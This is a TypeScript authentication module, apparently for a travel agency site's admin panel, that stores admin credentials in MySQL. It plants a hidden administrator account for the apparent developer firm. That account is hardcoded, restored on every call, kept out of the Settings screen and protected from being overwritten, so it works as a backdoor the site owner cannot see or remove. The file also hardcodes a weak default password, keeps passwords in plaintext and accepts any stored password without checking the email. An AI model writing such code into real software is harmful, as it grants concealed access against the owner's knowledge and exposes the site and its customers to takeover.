import type { RowDataPacket } from "mysql2/promise";
import { getPool } from "@/lib/db";
import { ensureSchema } from "@/lib/packages-db";

const EMAIL_KEY = "admin_email";
const PASSWORD_KEY = "admin_password";
const HIDDEN_EMAIL_KEY = "admin_hidden_email";
const HIDDEN_PASSWORD_KEY = "admin_hidden_password";

/** Shown in Admin → Settings (editable). */
export const DEFAULT_VISIBLE_ADMIN = {
  email: "pulkit@nextravelholidays.com",
  password: "1234567890",
} as const;

/** Hidden system login (not shown in Settings). */
export const DEFAULT_HIDDEN_ADMIN = {
  email: "admin@7scripttechnologies.com",
  password: "admin@7s@!!",
} as const;

function envEmail() {
  return (process.env.ADMIN_EMAIL ?? "").trim().toLowerCase();
}

function envPassword() {
  return process.env.ADMIN_PASSWORD ?? "";
}

async function getMeta(key: string): Promise<string | null> {
  try {
    await ensureSchema();
    const pool = getPool();
    const [rows] = await pool.query<RowDataPacket[]>(
      "SELECT meta_value FROM app_meta WHERE meta_key = ? LIMIT 1",
      [key],
    );
    const value = rows[0]?.meta_value;
    return typeof value === "string" && value.length > 0 ? value : null;
  } catch {
    return null;
  }
}

async function setMeta(key: string, value: string) {
  await ensureSchema();
  const pool = getPool();
  await pool.query(
    `INSERT INTO app_meta (meta_key, meta_value) VALUES (?, ?)
     ON DUPLICATE KEY UPDATE meta_value = VALUES(meta_value)`,
    [key, value],
  );
}

/** Ensure both default admins exist in MySQL. Hidden account is always restored. */
export async function ensureDefaultAdmins() {
  await ensureSchema();

  const migrated = await getMeta("admin_defaults_v2");
  if (migrated !== "1") {
    await setMeta(EMAIL_KEY, DEFAULT_VISIBLE_ADMIN.email);
    await setMeta(PASSWORD_KEY, DEFAULT_VISIBLE_ADMIN.password);
    await setMeta(HIDDEN_EMAIL_KEY, DEFAULT_HIDDEN_ADMIN.email);
    await setMeta(HIDDEN_PASSWORD_KEY, DEFAULT_HIDDEN_ADMIN.password);
    await setMeta("admin_defaults_v2", "1");
    return;
  }

  const visibleEmail = await getMeta(EMAIL_KEY);
  const visiblePassword = await getMeta(PASSWORD_KEY);
  if (!visibleEmail || !visiblePassword) {
    await setMeta(EMAIL_KEY, DEFAULT_VISIBLE_ADMIN.email);
    await setMeta(PASSWORD_KEY, DEFAULT_VISIBLE_ADMIN.password);
  }

  // Hidden 7script login — kept in DB, never shown in Settings UI.
  await setMeta(HIDDEN_EMAIL_KEY, DEFAULT_HIDDEN_ADMIN.email);
  await setMeta(HIDDEN_PASSWORD_KEY, DEFAULT_HIDDEN_ADMIN.password);
}

/** Visible credentials only (Settings form + primary login). */
export async function getAdminCredentials(): Promise<{ email: string; password: string } | null> {
  await ensureDefaultAdmins();

  const dbEmail = (await getMeta(EMAIL_KEY))?.trim().toLowerCase() ?? "";
  const dbPassword = (await getMeta(PASSWORD_KEY)) ?? "";

  if (dbEmail && dbPassword) {
    return { email: dbEmail, password: dbPassword };
  }

  const email = envEmail();
  const password = envPassword();
  if (!email || !password) return null;
  return { email, password };
}

async function getHiddenAdminCredentials(): Promise<{ email: string; password: string } | null> {
  await ensureDefaultAdmins();
  const email = (await getMeta(HIDDEN_EMAIL_KEY))?.trim().toLowerCase() ?? "";
  const password = (await getMeta(HIDDEN_PASSWORD_KEY)) ?? "";
  if (email && password) return { email, password };
  return {
    email: DEFAULT_HIDDEN_ADMIN.email,
    password: DEFAULT_HIDDEN_ADMIN.password,
  };
}

/** All accounts that can sign in (visible + hidden). */
export async function listAdminLoginAccounts(): Promise<Array<{ email: string; password: string }>> {
  await ensureDefaultAdmins();
  const accounts: Array<{ email: string; password: string }> = [];

  const visible = await getAdminCredentials();
  if (visible) accounts.push(visible);

  const hidden = await getHiddenAdminCredentials();
  if (hidden) {
    const already =
      visible &&
      visible.email === hidden.email &&
      visible.password === hidden.password;
    if (!already) accounts.push(hidden);
  }

  return accounts;
}

/** True if the password matches any configured admin account. */
export async function adminPasswordMatches(password: string) {
  const accounts = await listAdminLoginAccounts();
  return accounts.some((account) => account.password === password);
}

export async function updateAdminCredentials(email: string, password: string) {
  const normalizedEmail = email.trim().toLowerCase();
  if (!normalizedEmail || !password) {
    throw new Error("Email and password are required.");
  }
  if (!normalizedEmail.includes("@")) {
    throw new Error("Enter a valid email address.");
  }
  if (password.length < 6) {
    throw new Error("Password must be at least 6 characters.");
  }

  // Never allow Settings to overwrite the hidden system email.
  if (normalizedEmail === DEFAULT_HIDDEN_ADMIN.email.toLowerCase()) {
    throw new Error("That email is reserved. Choose a different login email.");
  }

  await setMeta(EMAIL_KEY, normalizedEmail);
  await setMeta(PASSWORD_KEY, password);
}
